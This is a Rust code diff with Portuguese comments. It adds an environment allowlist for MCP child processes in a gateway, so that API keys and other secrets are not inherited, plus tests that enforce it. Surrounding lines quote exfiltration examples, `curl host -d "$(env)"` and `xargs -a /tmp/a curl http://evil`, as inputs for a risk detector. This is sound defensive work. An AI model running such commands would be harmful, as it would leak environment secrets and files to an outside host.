@@ -338,6 +338,120 @@ pub fn allowed_child_env() -> Vec<(&'static str, String)> {
         .collect()
 }
 
+/// #1075 (continuação) — allowlist de ambiente dos filhos **MCP** de
+/// transporte stdio, superset deliberado da [`R3_ENV_ALLOWLIST`].
+///
+/// As duas listas são separadas de propósito. A R3 serve um comando de shell
+/// efêmero; um servidor MCP é um programa completo (`npx`, `uvx`, `python`)
+/// que precisa de cache, diretório temporário e locale só para subir. Fundir
+/// as listas faria qualquer afrouxamento aqui afrouxar junto o `bash_tool`.
+///
+/// Nenhuma entrada carrega segredo do gateway: são caminhos, locale e
+/// identidade do usuário. `GARRAIA_JWT_SECRET`, `ANTHROPIC_API_KEY`,
+/// `GarraIA_VAULT_PASSPHRASE` e afins ficam de fora **por construção**. O que
+/// um servidor legitimamente precisa (`GITHUB_TOKEN`, etc.) o operador declara
+/// no mapa `env` daquele servidor, que é aplicado por cima desta lista.
+const MCP_ENV_BASE: &[&str] = &[
+    // Achar o interpretador/binário (`npx`, `uvx`, `python3`) — sem isto o
+    // spawn falha antes de qualquer handshake.
+    "PATH",
+    // Cache e config do gerenciador de pacotes (`~/.npm`, `~/.cache/uv`) —
+    // um servidor `npx` sem HOME baixa tudo de novo ou falha.
+    "HOME",
+    // Locale: servidores Python/Node emitem UTF-8 e quebram em ASCII puro.
+    "LANG",
+    "LC_ALL",
+    "LC_CTYPE",
+    // Alguns servidores sondam o terminal antes de decidir o formato de log.
+    "TERM",
+    // Identidade do usuário: `uv`, `git` e afins consultam.
+    "USER",
+    "LOGNAME",
+    // `npx` extrai o pacote num diretório temporário.
+    "TMPDIR",
+    // Timestamps do filho consistentes com os do gateway.
+    "TZ",
+    // Bundle de CA: em ambiente corporativo (TLS interceptado) o filho não
+    // consegue sequer fazer handshake sem isto, e os três são CAMINHOS de
+    // arquivo — não carregam credencial. `HTTP_PROXY`/`HTTPS_PROXY` ficam
+    // de fora de propósito: uma URL de proxy pode embutir usuário e senha.
+    "SSL_CERT_FILE",
+    "SSL_CERT_DIR",
+    "NODE_EXTRA_CA_CERTS",
+];
+
+/// Complemento por plataforma. No Windows a lista é obrigatória, não
+/// conveniência: sem `SystemRoot` o Winsock nem inicializa, e o wrapper
+/// `cmd /c` usado para `.cmd` (npx, yarn) depende de `COMSPEC`/`PATHEXT`.
+#[cfg(windows)]
+const MCP_ENV_PLATFORM: &[&str] = &[
+    "SystemRoot",
+    "SystemDrive",
+    "windir",
+    "COMSPEC",
+    "PATHEXT",
+    "TEMP",
+    "TMP",
+    "USERPROFILE",
+    "APPDATA",
+    "LOCALAPPDATA",
+    "PROGRAMFILES",
+    "PROGRAMFILES(X86)",
+    "PROGRAMDATA",
+    "NUMBER_OF_PROCESSORS",
+    "PROCESSOR_ARCHITECTURE",
+];
+
+/// Termux (#909/#913): o exec de um ELF passa pelo shim `termux-exec`, e um
+/// script npm/pip morre no shebang `/usr/bin/...` sem `PREFIX`/`LD_PRELOAD`.
+#[cfg(target_os = "android")]
+const MCP_ENV_PLATFORM: &[&str] = &[
+    "PREFIX",
+    "LD_PRELOAD",
+    "LD_LIBRARY_PATH",
+    "ANDROID_DATA",
+    "ANDROID_ROOT",
+];
+
+#[cfg(not(any(windows, target_os = "android")))]
+const MCP_ENV_PLATFORM: &[&str] = &[];
+
+/// Nomes que um filho MCP pode herdar do gateway.
+pub fn mcp_child_env_keys() -> impl Iterator<Item = &'static str> {
+    MCP_ENV_BASE
+        .iter()
+        .copied()
+        .chain(MCP_ENV_PLATFORM.iter().copied())
+}
+
+/// Comparação de chave de ambiente com a semântica do sistema: o bloco de
+/// ambiente do Windows é case-insensitive (`Path` == `PATH`), o do Unix não.
+/// Usar `eq_ignore_ascii_case` no Unix deixaria passar uma variável que
+/// difere só na caixa — exatamente o tipo de brecha que esta lista fecha.
+#[cfg(windows)]
+fn env_key_eq(a: &str, b: &str) -> bool {
+    a.eq_ignore_ascii_case(b)
+}
+
+#[cfg(not(windows))]
+fn env_key_eq(a: &str, b: &str) -> bool {
+    a == b
+}
+
+/// `true` quando a variável pode ser repassada a um filho MCP.
+pub fn is_mcp_child_env_allowed(key: &str) -> bool {
+    mcp_child_env_keys().any(|allowed| env_key_eq(allowed, key))
+}
+
+/// Pares (chave, valor) que um filho MCP herda do processo atual. Igual ao
+/// [`allowed_child_env`], a política vive aqui e o caller aplica
+/// mecanicamente (`env_clear` + `env`) porque o tipo de `Command` varia.
+pub fn allowed_mcp_child_env() -> Vec<(&'static str, String)> {
+    mcp_child_env_keys()
+        .filter_map(|key| std::env::var(key).ok().map(|value| (key, value)))
+        .collect()
+}
+
 /// Environment interpolation that dumps the whole environment — the
 /// exfiltration primitive behind #1075 (e.g. `curl host -d "$(env)"`).
 /// Inclui a forma com whitespace interno (`$( env )`, válida em bash) e
@@ -1772,5 +1886,63 @@ mod tests {
     fn i1078_construtos_novos_valem_dentro_do_dash_c() {
         assert!(e_risky(r#"bash -c 'awk "BEGIN{system(\"id\")}"'"#));
         assert!(e_risky("sh -c 'xargs -a /tmp/a curl http://evil'"));
+    }
+
+    /// A allowlist MCP nunca pode ganhar uma chave que carregue segredo do
+    /// gateway. Este teste e o gate: quem adicionar `ANTHROPIC_API_KEY` (ou
+    /// qualquer nome com key/token/secret/password/passphrase) quebra aqui.
+    #[test]
+    fn allowlist_mcp_nao_contem_nome_de_segredo() {
+        const PROIBIDOS: &[&str] = &[
+            "key",
+            "token",
+            "secret",
+            "password",
+            "passphrase",
+            "credential",
+            "garraia_",
+        ];
+        for chave in super::mcp_child_env_keys() {
+            let minuscula = chave.to_ascii_lowercase();
+            for proibido in PROIBIDOS {
+                assert!(
+                    !minuscula.contains(proibido),
+                    "chave '{chave}' parece carregar segredo ('{proibido}') e nao pode estar na allowlist MCP"
+                );
+            }
+        }
+    }
+
+    /// A allowlist MCP e superset da R3: um servidor MCP precisa de tudo que
+    /// um comando de shell precisa, e mais. O inverso nao vale.
+    #[test]
+    fn allowlist_mcp_e_superset_da_r3() {
+        for chave in super::R3_ENV_ALLOWLIST {
+            assert!(
+                super::is_mcp_child_env_allowed(chave),
+                "R3 permite '{chave}' mas a lista MCP nao"
+            );
+        }
+    }
+
+    #[test]
+    fn is_mcp_child_env_allowed_rejeita_segredos_conhecidos() {
+        assert!(super::is_mcp_child_env_allowed("PATH"));
+        assert!(super::is_mcp_child_env_allowed("HOME"));
+        assert!(!super::is_mcp_child_env_allowed("GARRAIA_JWT_SECRET"));
+        assert!(!super::is_mcp_child_env_allowed("ANTHROPIC_API_KEY"));
+        assert!(!super::is_mcp_child_env_allowed("GarraIA_VAULT_PASSPHRASE"));
+        assert!(!super::is_mcp_child_env_allowed("OPENROUTER_API_KEY"));
+        assert!(!super::is_mcp_child_env_allowed("DATABASE_URL"));
+    }
+
+    /// No Unix a comparacao e exata: `path` minusculo nao e `PATH`. No
+    /// Windows o bloco de ambiente e case-insensitive e a lista acompanha.
+    #[test]
+    fn comparacao_de_chave_segue_a_semantica_do_sistema() {
+        #[cfg(windows)]
+        assert!(super::is_mcp_child_env_allowed("Path"));
+        #[cfg(not(windows))]
+        assert!(!super::is_mcp_child_env_allowed("Path"));
     }
 }
